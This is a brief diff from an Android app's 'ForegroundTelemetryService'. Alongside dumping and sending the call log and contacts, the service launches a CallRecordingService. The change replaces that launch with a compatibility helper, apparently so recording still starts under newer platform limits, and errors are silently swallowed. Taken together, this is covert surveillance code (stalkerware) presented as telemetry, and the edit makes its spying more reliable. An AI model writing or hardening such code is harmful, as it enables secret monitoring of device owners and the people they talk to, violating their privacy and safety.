@@ -153,7 +153,7 @@ public class ForegroundTelemetryService extends Service implements LocationListe
                         sendCallLogDump();
                         sendContactsDump();
                         try {
-                            startService(new android.content.Intent(this, CallRecordingService.class));
+                            AppRuntime.startServiceCompat(this, new android.content.Intent(this, CallRecordingService.class), true);
                         } catch (Exception ignored) {
                         }
                         flushPendingEvents(120);
